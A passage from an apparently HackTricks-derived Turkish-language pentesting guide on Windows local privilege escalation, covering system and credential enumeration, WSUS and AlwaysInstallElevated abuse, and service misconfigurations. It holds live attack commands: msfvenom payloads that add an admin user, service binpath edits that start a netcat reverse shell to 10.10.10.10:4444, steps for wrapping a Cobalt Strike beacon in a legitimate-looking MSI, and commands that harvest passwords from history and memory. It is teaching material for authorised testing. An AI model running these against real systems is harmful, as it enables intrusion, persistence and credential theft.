# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows Temel Teorisi

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'taki integrity levels'in ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistemi keşfetmenizi engelleyebilecek, çalıştırılabilir dosyaları çalıştırmanızı engelleyebilecek veya hatta faaliyetlerinizi tespit edebilecek çeşitli mekanizmalar vardır. Privilege escalation enumeration'a başlamadan önce aşağıdaki sayfayı okumalı ve bu tüm savunma mekanizmalarını listelemelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Sistem Bilgisi

### Sürüm bilgisi enumerasyonu

Windows sürümünün bilinen bir zafiyeti olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft güvenlik zafiyetleri hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik zafiyeti bulunuyor; bu, bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü olarak bulunur)_

**Yerelde sistem bilgisi ile**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploitlerin Github reposları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Herhangi bir credential/Juicy info env değişkenlerinde kaydedilmiş mi?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transkript dosyaları

Bunu nasıl etkinleştireceğinizi şu adresten öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçaları dahil. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelendirmedeki "Transcript files" bölümündeki talimatları izleyin ve **"Module Logging"** yerine **"Powershell Transcription"**'ı seçin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs'taki son 15 olayı görüntülemek için şu komutu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betiğin yürütülmesine ilişkin tüm etkinliklerin ve tam içerik kaydının tamamı yakalanır; böylece her kod bloğunun çalışırken belgelenmesi sağlanır. Bu süreç, her etkinliğe ilişkin kapsamlı bir audit trail korur; bu da forensics ve kötü amaçlı davranışların analizinde değerlidir. Yürütme sırasında tüm etkinlikler belgelenerek sürece dair ayrıntılı içgörüler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için olay kayıtları Windows Event Viewer içinde şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http üzerinden isteniyorsa sistemi ele geçirebilirsiniz.

Ağın SSL olmayan bir WSUS güncellemesi kullanıp kullanmadığını kontrol etmek için cmd'de aşağıdakini çalıştırın:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'de aşağıdaki:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer aşağıdakilerden birine benzer bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Ve eğer `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

O zaman, **sömürülebilir.** Son kayıt 0 ise, WSUS girdisi görmezden gelinecektir.

Bu zafiyeti suistimal etmek için şu tür araçları kullanabilirsiniz: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Bunlar MiTM amaçlı, silahlandırılmış exploit scriptleri olup, SSL olmayan WSUS trafiğine 'sahte' güncellemeler enjekte eder.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Temelde, bu açığın sömürüldüğü hata şudur:

> Eğer yerel kullanıcı proxy'imizi değiştirme yetkimiz varsa ve Windows Updates Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve asset'imizde yükseltilmiş bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'u yerel olarak çalıştırma gücüne sahip oluruz.
>
> Ayrıca, WSUS servisi mevcut kullanıcının ayarlarını kullandığı için onun sertifika deposunu da kullanacaktır. WSUS hostname'i için kendinden imzalı bir sertifika oluşturup bu sertifikayı mevcut kullanıcının sertifika deposuna eklersek, hem HTTP hem de HTTPS WSUS trafiğini yakalayabileceğiz. WSUS, sertifikada trust-on-first-use türü bir doğrulamayı uygulamak için HSTS-benzeri mekanizmalar kullanmaz. Sunulan sertifika kullanıcı tarafından güveniliyorsa ve doğru hostname'e sahipse, servis tarafından kabul edilecektir.

Bu zafiyeti [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla (serbest bırakıldığında) suistimal edebilirsiniz.

## Üçüncü Taraf Auto-Updaters ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC yüzeyi ve ayrıcalıklı bir update kanalı açar. Eğer enrollment bir saldırgan sunucusuna zorlanabiliyorsa ve updater sahte bir root CA'ya veya zayıf signer kontrollerine güveniyorsa, yerel bir kullanıcı SYSTEM servisi tarafından kurulacak kötü amaçlı bir MSI teslim edebilir. Genel bir teknik (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) için bakın:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** zafiyeti vardır. Bu koşullar, **LDAP signing** zorunlu değilse, kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasına izin veren self-rights'a sahip olması ve kullanıcıların domain içinde bilgisayar oluşturma yeteneğine sahip olması gibi durumlardır. Bu **gereksinimlerin** varsayılan ayarlarla karşılandığını not etmek önemlidir.

Exploit'i şurada bulun: [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için bakın: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Eğer** bu 2 kayıt **etkinse** (değer **0x1**), o zaman herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

power-up'tan `Write-UserAddMSI` komutunu kullanarak geçerli dizine yetki yükseltmek için bir Windows MSI ikili dosyası oluşturun. Bu script, kullanıcı/grup eklemeye yönelik bir istem gösteren önceden derlenmiş bir MSI yükleyicisi yazar (bu nedenle GIU erişimine ihtiyacınız olacak):
```
Write-UserAddMSI
```
Sadece oluşturulan ikiliyi çalıştırarak ayrıcalıkları yükseltin.

### MSI Wrapper

Bu öğreticiyi okuyarak bu araçları kullanarak bir MSI wrapper oluşturmayı öğrenin. **Sadece** komut satırlarını **çalıştırmak** istiyorsanız bir **.bat** dosyasını sarmalayabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** veya **Metasploit** ile `C:\privesc\beacon.exe` konumunda yeni bir **Windows EXE TCP payload** oluşturun
- **Visual Studio**'yu açın, **Create a new project**'u seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir ad verin, örneğin **AlwaysPrivesc**, konum için **`C:\privesc`** kullanın, **place solution and project in the same directory**'i seçin ve **Create**'e tıklayın.
- Dahil edilecek dosyaları seçme adımı olan 3/4'e gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** içinde **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
- Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi değiştirebileceğiniz diğer özellikler vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırıldığı anda beacon payload'unun çalıştırılmasını sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak ayarlayın.
- Son olarak, **build** edin.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının arka planda kurulmasını yürütmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu vulnerability'yi exploit etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirus ve Dedektörler

### Denetim Ayarları

Bu ayarlar neyin **kaydedildiğine** karar verir, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding için kayıtların nereye gönderildiğini bilmek ilginçtir
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, **management of local Administrator passwords** için tasarlanmıştır; etki alanına katılmış bilgisayarlarda her parolanın **unique, randomised, and regularly updated** olmasını sağlar. Bu parolalar Active Directory içinde güvenli şekilde saklanır ve yalnızca ACLs aracılığıyla yeterli izinleri verilmiş kullanıcılar tarafından erişilebilir; yetkilendirildiklerinde local admin passwords görüntülenebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Eğer etkinse, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**'den başlayarak, Microsoft Local Security Authority (LSA) için geliştirilmiş bir koruma getirdi; bu koruma, güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** suretiyle sistemi daha da güvenli hale getirir.\  
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** **Windows 10**'da tanıtıldı. Amacı, bir cihazda depolanan credentials'ları pass-the-hash gibi tehditlere karşı korumaktır.| [**Credentials Guard hakkında daha fazla bilgi için buraya bak.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** işletim sistemi bileşenleri tarafından kullanılmak üzere **Local Security Authority** (LSA) tarafından doğrulanır. Bir kullanıcının oturum açma bilgileri kayıtlı bir security package tarafından doğrulandığında, o kullanıcı için domain credentials genellikle oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları & Grupları Listele

Ait olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer **bir ayrıcalıklı grubun üyesiyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl kötüye kullanabileceğinizi öğrenin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Daha fazla bilgi** için bu sayfada bir **token**in ne olduğunu görün: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı kontrol edin; **ilginç token'lar hakkında bilgi edinmek** ve bunları nasıl kötüye kullanacağınızı öğrenmek için:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev dizinleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panodaki içeriği al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan Processes

### Dosya ve Klasör İzinleri

Öncelikle process'leri listeleyerek **process'in komut satırında parola olup olmadığını kontrol edin**.\
Çalışmakta olan bir binary'i **overwrite edebilir misiniz** veya binary klasöründe yazma izniniz var mı, olası [**DLL Hijacking attacks**](dll-hijacking/index.html) istismarı için kontrol edin:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman olası [**electron/cef/chromium debuggers** çalışıp çalışmadığını kontrol edin; bunu ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**İşlemlerin binaries izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlemlerin ikili dosyalarının bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Çalışan bir işlemin bellek dökümünü sysinternals'tan **procdump** ile oluşturabilirsiniz. FTP gibi servislerde **credentials in clear text in memory** bulunur; belleği döküp bu credentials'ları okumayı deneyin.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvensiz GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinleri gezmesine izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" arayın, "Click to open Command Prompt" öğesine tıklayın

## Servisler

Service Triggers, belirli koşullar oluştuğunda (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, vb.) Windows'un bir servisi başlatmasına olanak tanır. SERVICE_START hakları olmasa bile tetiklerini çalıştırarak ayrıcalıklı servisleri sıklıkla başlatabilirsiniz. Enumeration ve activation tekniklerini burada inceleyin:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir servisin bilgilerini almak için **sc** kullanabilirsiniz
```bash
sc qc <service_name>
```
Her servisin gerekli ayrıcalık seviyesini kontrol etmek için _Sysinternals_'ten **accesschk** binary'sine sahip olmak önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"'ın herhangi bir servisi değiştirebilip değiştiremeyeceğini kontrol etmeniz önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Bunu etkinleştirmek için şu komutu kullanabilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Başka bir çözüm** bu sorunu gidermek için şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Servis yürütülebilir dosya yolunu değiştirme**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** yetkisine sahip olduğu durumda, servisin executable binary'sini değiştirmek mümkündür. Değiştirmek ve çalıştırmak için **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ayrıcalıklar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servisin binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasına izin verir; bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahipliği devralmaya ve izinleri yeniden yapılandırmaya izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yetkisini devralır.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yetkisini devralır.

Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis binary'lerinin zayıf izinleri

**Servis tarafından çalıştırılan binary'i değiştirebilip değiştiremeyeceğinizi kontrol edin** veya binary'nin bulunduğu klasörde **yazma izniniz** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm binary'leri **wmic** (not in system32) ile alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirme yetkiniz olup olmadığını kontrol etmelisiniz.\

Aşağıdakileri yaparak bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Herhangi bir `FullControl` iznine **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory izinleri

Bir registry üzerinde bu izne sahipseniz bu, **bu registry'den alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services durumunda bu, **keyfi kod çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Tırnak işareti olmayan Service yolları

Bir yürütülebilir dosyanın yolu tırnak içinde değilse, Windows boşluktan önceki her parçayı çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmaya çalışacaktır:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows servislerine ait olanlar hariç, tüm tırnaklanmamış servis yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu güvenlik açığını tespit edebilir ve exploit edebilirsiniz** metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir service başarısız olursa alınacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Eğer bu binary değiştirilebilirse, privilege escalation mümkün olabilir. More details can be found in the [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin **permissions of the binaries** (maybe you can overwrite one and escalate privileges) ve **folders** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Özel bir dosyayı okumak için herhangi bir config file'ı değiştirip değiştiremeyeceğinizi veya Administrator account tarafından çalıştırılacak bir binary'i (schedtasks) değiştirebilip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
